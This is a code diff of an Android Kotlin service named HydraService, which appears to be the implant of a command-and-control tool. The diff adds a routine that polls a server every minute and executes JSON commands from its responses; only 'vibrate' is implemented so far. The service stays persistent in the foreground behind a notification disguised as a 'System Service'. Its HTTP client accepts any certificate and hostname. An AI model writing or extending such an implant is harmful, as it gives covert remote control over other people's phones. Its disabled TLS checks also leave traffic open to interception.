@@ -6,15 +6,12 @@ import android.app.NotificationManager
 import android.app.Service
 import android.content.Context
 import android.content.Intent
-import android.os.Build
-import android.os.Handler
-import android.os.IBinder
-import android.os.Looper
-import android.os.PowerManager
+import android.os.*
 import android.util.Log
 import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.RequestBody.Companion.toRequestBody
+import org.json.JSONObject
 import java.io.IOException
 import java.security.SecureRandom
 import java.security.cert.X509Certificate
@@ -24,12 +21,11 @@ class HydraService : Service() {
     private val TAG = "Hydra"
     private val client = unsafeOkHttpClient()
     private val handler = Handler(Looper.getMainLooper())
-    private val heartbeatInterval = 60000L // 1 minute
+    private val heartbeatInterval = 60000L
     private var wakeLock: PowerManager.WakeLock? = null
 
     private val checkInRunnable = object : Runnable {
         override fun run() {
-            Log.d(TAG, "Executing scheduled heartbeat...")
             performCheckIn()
             handler.postDelayed(this, heartbeatInterval)
         }
@@ -44,41 +40,25 @@ class HydraService : Service() {
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         Log.i(TAG, "Ghost Service Started - Heartbeat active")
-        
-        // Promote to foreground to prevent the OS from killing the service
         startMyForegroundService()
-        
         handler.removeCallbacks(checkInRunnable)
         handler.post(checkInRunnable)
-        
         return START_STICKY
     }
 
     private fun startMyForegroundService() {
         val channelId = "hydra_c2_channel"
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channel = NotificationChannel(
-                channelId,
-                "Hydra System Service",
-                NotificationManager.IMPORTANCE_LOW
-            )
+            val channel = NotificationChannel(channelId, "Hydra System Service", NotificationManager.IMPORTANCE_LOW)
             val manager = getSystemService(NotificationManager::class.java)
             manager.createNotificationChannel(channel)
         }
 
-        val notification: Notification = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            Notification.Builder(this, channelId)
-                .setContentTitle("System Service")
-                .setContentText("Hydra connectivity active")
-                .setSmallIcon(android.R.drawable.stat_notify_sync)
-                .build()
-        } else {
-            Notification.Builder(this)
-                .setContentTitle("System Service")
-                .setContentText("Hydra connectivity active")
-                .setSmallIcon(android.R.drawable.stat_notify_sync)
-                .build()
-        }
+        val notification: Notification = Notification.Builder(this, channelId)
+            .setContentTitle("System Service")
+            .setContentText("Hydra connectivity active")
+            .setSmallIcon(android.R.drawable.stat_notify_sync)
+            .build()
 
         startForeground(1, notification)
     }
@@ -92,23 +72,51 @@ class HydraService : Service() {
             override fun onFailure(call: Call, e: IOException) {
                 Log.e(TAG, "Heartbeat failed: ${e.message}")
             }
+
             override fun onResponse(call: Call, response: Response) {
-                if (response.isSuccessful) {
-                    Log.i(TAG, "Heartbeat successful: ${response.code}")
-                } else {
-                    Log.w(TAG, "Server rejected heartbeat: ${response.code}")
+                val responseData = response.body?.string()
+                if (response.isSuccessful && responseData != null) {
+                    Log.i(TAG, "Check-in Successful")
+                    parseCommand(responseData)
                 }
                 response.close()
             }
         })
     }
 
-    override fun onDestroy() {
-        Log.w(TAG, "Service being destroyed. Cleaning up...")
-        handler.removeCallbacks(checkInRunnable)
-        if (wakeLock?.isHeld == true) {
-            wakeLock?.release()
+    private fun parseCommand(jsonData: String) {
+        try {
+            val json = JSONObject(jsonData)
+            if (json.has("command") && !json.isNull("command")) {
+                val cmd = json.getJSONObject("command")
+                val action = cmd.getString("action")
+                Log.i(TAG, "[!] Received Command: $action")
+
+                if (action == "vibrate") {
+                    val duration = cmd.optLong("duration", 1000L) // Default 1s if null
+                    val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
+                    
+                    // This log MUST appear if the code reaches the execution line
+                    Log.i(TAG, ">> [ACTION] Executing Command: Vibrate ($duration ms)")
+
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                        vibrator.vibrate(VibrationEffect.createOneShot(duration, VibrationEffect.DEFAULT_AMPLITUDE))
+                    } else {
+                        @Suppress("DEPRECATION")
+                        vibrator.vibrate(duration)
+                    }
+                }
+            } else {
+                Log.d(TAG, "No pending command in this heartbeat.")
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error parsing command: ${e.message}")
         }
+    }
+
+    override fun onDestroy() {
+        handler.removeCallbacks(checkInRunnable)
+        if (wakeLock?.isHeld == true) wakeLock?.release()
         super.onDestroy()
     }
 
@@ -120,10 +128,9 @@ class HydraService : Service() {
             override fun checkServerTrusted(chain: Array<out X509Certificate>?, authType: String?) {}
             override fun getAcceptedIssuers(): Array<X509Certificate> = arrayOf()
         })
-
-        val sslContext = SSLContext.getInstance("SSL")
-        sslContext.init(null, trustAllCerts, SecureRandom())
-
+        val sslContext = SSLContext.getInstance("SSL").apply {
+            init(null, trustAllCerts, SecureRandom())
+        }
         return OkHttpClient.Builder()
             .sslSocketFactory(sslContext.socketFactory, trustAllCerts[0] as X509TrustManager)
             .hostnameVerifier { _, _ -> true }
